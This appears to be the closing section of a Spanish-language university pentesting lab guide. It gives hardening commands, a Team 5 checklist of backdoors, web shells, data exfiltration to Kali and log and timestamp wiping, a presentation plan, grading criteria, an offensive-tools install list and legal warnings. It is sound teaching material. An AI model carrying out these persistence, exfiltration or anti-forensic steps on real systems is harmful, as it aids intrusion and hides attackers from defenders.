   1. Wazuh
   1. OSQuery
   1. Velociraptor

**Configuraciones de Hardening**

\# 1. Deshabilitar login root via SSH

sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd\_config

\# 2. Implementar fail2ban

apt-get install fail2ban

systemctl enable fail2ban

\# 3. Configurar auditd para monitoreo

apt-get install auditd

auditctl -w /etc/passwd -p wa -k passwd\_changes

auditctl -w /etc/shadow -p wa -k shadow\_changes

auditctl -w /etc/crontab -p wa -k cron\_changes

\# 4. Implementar AppArmor o SELinux

apt-get install apparmor apparmor-utils

\# 5. Configurar syslog remoto

\# Editar /etc/rsyslog.conf

\# \*.\* @@remote-syslog-server:514

\# 6. Deshabilitar servicios innecesarios

systemctl disable telnet

systemctl disable ftp

systemctl disable rsh

\# 7. Actualizar sistema

apt-get update && apt-get upgrade -y

-----
**📋 CHECKLIST FINAL PARA EQUIPO 5**

- ![ref1]**Persistencia**
  - ![ref1] Usuario backdoor creado y probado
  - ![ref1] SSH key backdoor instalada y funcional
  - ![ref1] Cron job configurado y probado
  - ![ref1] Web shells desplegadas y accesibles
  - ![ref1] Startup backdoor configurado
- ![ref1]**Exfiltración**
  - ![ref1] Datos sensibles identificados y recopilados
  - ![ref1] Bases de datos exportadas
  - ![ref1] Credenciales extraídas
  - ![ref1] Datos comprimidos
  - ![ref1] Exfiltración exitosa a Kali
  - ![ref1] Integridad verificada (MD5)
- ![ref1]**Limpieza**
  - ![ref1] Logs del sistema limpiados
  - ![ref1] Historial de comandos eliminado
  - ![ref1] Archivos temporales removidos
  - ![ref1] Timestamps modificados
  - ![ref1] Conexiones de red limpiadas


- ![ref1]**Documentación**
  - ![ref1] Reporte final completo
  - ![ref1] Screenshots de cada técnica
  - ![ref1] Comandos documentados
  - ![ref1] Archivos técnicos organizados
  - ![ref1] Presentación preparada
- ![ref1]**Demostración**
  - ![ref1] Script de demo preparado
  - ![ref1] Backdoors verificados funcionales
  - ![ref1] Timing de presentación ensayado
  - ![ref1] Preguntas anticipadas preparadas
-----
**

**🎯 INTEGRACIÓN FINAL: PRESENTACIÓN CONJUNTA DE LOS 5 EQUIPOS**

**Estructura de la Presentación Integrada**

INTRODUCCIÓN

\- Contexto del escenario

\- Objetivo del ejercicio

\- Metodología de ataque

EQUIPO 1: RECONOCIMIENTO

\- Metodología de escaneo

\- Vulnerabilidades identificadas

\- Priorización de objetivos

\- Handoff a Equipo 2

EQUIPO 2: EXPLOTACIÓN

\- Exploits utilizados

\- Shells obtenidas

\- Nivel de acceso conseguido

\- Handoff a Equipo 3

EQUIPO 3: POST-EXPLOTACIÓN

\- Enumeración interna

\- Información recopilada

\- Vectores identificados

\- Handoff a Equipos 4 y 5

EQUIPO 4: ESCALADA DE PRIVILEGIOS

\- Técnicas de escalada

\- Acceso root obtenido

\- Comparación de métodos

\- Handoff a Equipo 5

EQUIPO 5: PERSISTENCIA Y EXFILTRACIÓN

\- Mecanismos de persistencia

\- Datos exfiltrados

\- Limpieza de rastros

\- Impacto final

DEMOSTRACIÓN EN VIVO

\- Ataque completo de principio a fin

\- Cada equipo muestra su fase

\- Flujo continuo

DEFENSA Y MITIGACIÓN

\- Cómo detectar cada fase

\- Herramientas de defensa

\- Recomendaciones de hardening

CONCLUSIONES Y LECCIONES APRENDIDAS

\- Reflexiones de cada equipo

\- Dificultades encontradas

\- Mejores prácticas

\- Preguntas y respuestas



-----
**📊 MATRIZ DE INTEGRACIÓN**

|**EQUIPO**|**ENTREGA**|**RECIBE**|**DEPENDENCIA**|
| :- | :- | :- | :- |
|**Equipo 1**|Matriz de vulnerabilidades|N/A|Ninguna|
|**Equipo 2**|Shells y accesos|Matriz de vulnerabilidades|Equipo 1 (info)|
|**Equipo 3**|Enumeración interna|Shells|Equipo 2 (info)|
|**Equipo 4**|Acceso root|Vectores de escalada|Equipo 3 (info)|
|**Equipo 5**|Persistencia completa|Acceso root|Equipo 4 (info)|

**NOTA IMPORTANTE**: Aunque hay un flujo lógico, cada equipo puede trabajar **INDEPENDIENTEMENTE** replicando los pasos necesarios de equipos anteriores.

-----
**🎓 CRITERIOS DE EVALUACIÓN**

**Evaluación Individual por Equipo (20 puntos c/u)**

**Técnica (10 puntos)**

- Correcta ejecución de comandos (4 pts)
- Comprensión de herramientas (3 pts)
- Solución de problemas (3 pts)

**Documentación (5 puntos)**

- Claridad y organización (2 pts)
- Screenshots y evidencias (2 pts)
- Comandos documentados (1 pt)

**Presentación (5 puntos)**

- Claridad en explicación (2 pts)
- Demostración en vivo (2 pts)
- Respuesta a preguntas (1 pt)

**Evaluación Integrada (20 puntos)**

**Colaboración (10 puntos)**

- Handoff efectivo entre equipos (4 pts)
- Comunicación y coordinación (3 pts)
- Integración de hallazgos (3 pts)

**Visión Global (10 puntos)**

- Comprensión del ciclo completo (4 pts)
- Conexión entre fases (3 pts)
- Pensamiento crítico (3 pts)

**TOTAL: 100 puntos**

-----
**📚 RECURSOS ADICIONALES**

**Documentación de Referencia**

1. **Metasploit Unleashed** (Offensive Security)
   1. <https://www.offensive-security.com/metasploit-unleashed/>
1. **OWASP Testing Guide**
   1. <https://owasp.org/www-project-web-security-testing-guide/>
1. **PTES (Penetration Testing Execution Standard)**
   1. <http://www.pentest-standard.org/>
1. **MITRE ATT&CK Framework**
   1. <https://attack.mitre.org/>
1. **GTFOBins** (Privilege Escalation)
   1. <https://gtfobins.github.io/>
**\


**Herramientas Complementarias**

\# Instalar herramientas adicionales en Kali

apt-get update

apt-get install -y \

`    `exploitdb \

`    `searchsploit \

`    `nikto \

`    `dirb \

`    `gobuster \

`    `hydra \

`    `john \

`    `hashcat \

`    `sqlmap \

`    `wpscan \

`    `enum4linux \

`    `smbclient \

`    `crackmapexec

-----
**⚠️ ADVERTENCIAS LEGALES Y ÉTICAS**

║                    ADVERTENCIA IMPORTANTE                     ║

Las técnicas enseñadas en esta práctica son EXCLUSIVAMENTE

para propósitos educativos en entornos controlados.

ESTÁ PROHIBIDO:

❌ Atacar sistemas sin autorización explícita por escrito

❌ Usar estas técnicas fuera del laboratorio

❌ Compartir backdoors o exploits con terceros

❌ Realizar ataques reales contra infraestructuras

ESTÁ PERMITIDO:

✅ Practicar en laboratorios personales

✅ Usar en sistemas propios

✅ Aplicar en pentesting autorizado

✅ Estudiar para certificaciones (OSCP, CEH, etc.)

El uso indebido de estas técnicas puede resultar en:

\- Acciones legales

\- Cargos criminales

\- Expulsión académica

\- Daño a su carrera profesional

-----
**

**🎉 CONCLUSIÓN DE LA PRÁCTICA**

¡Felicitaciones! Has completado un ciclo completo de ataque simulando un APT (Advanced Persistent Threat) real.

**Has aprendido:**

- ✅ Reconocimiento y enumeración profesional
- ✅ Explotación de múltiples vulnerabilidades
- ✅ Post-explotación y recopilación de inteligencia
- ✅ Escalada de privilegios con diversas técnicas
- ✅ Establecimiento de persistencia
- ✅ Exfiltración de datos sensibles
- ✅ Técnicas anti-forenses básicas

|Noviembre 2025|Elaborado por Gustavo Lara Jr.|
| :- | -: |

[ref1]: Aspose.Words.f2c0a3f5-2c2a-4913-87d4-d4f658549340.002.png
